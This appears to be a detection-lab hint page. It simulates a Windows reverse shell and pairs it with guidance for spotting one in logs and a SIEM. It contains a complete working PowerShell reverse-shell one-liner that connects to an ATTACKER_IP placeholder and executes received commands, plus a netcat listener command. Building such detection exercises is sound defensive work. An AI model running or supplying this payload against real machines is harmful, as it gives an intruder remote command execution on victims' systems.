# Hint 10: Reverse Shell

## Scenario Overview

Simulates establishing a reverse shell from a Windows victim to an attacker, allowing remote command execution.

## Simulation Steps

**On Windows (Victim):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**On Kali (Attacker):**
```bash
nc -lvnp 4444
```

## Detection Guidance

- **Key Logs/Events:**
  - Abnormal parent-child (e.g., explorer.exe → powershell.exe)
  - Event ID 3: Outbound connection
- **SIEM Query Example:** `destination.port:4444 AND process.name:"powershell.exe"`
- **What to Look For:** Outbound connections from PowerShell to non-standard ports, suspicious process trees.

## Example Log Artifacts

(Paste actual log lines or reference screenshots here if available.)

## Additional Notes

Monitor for powershell.exe making outbound connections, especially on uncommon ports.
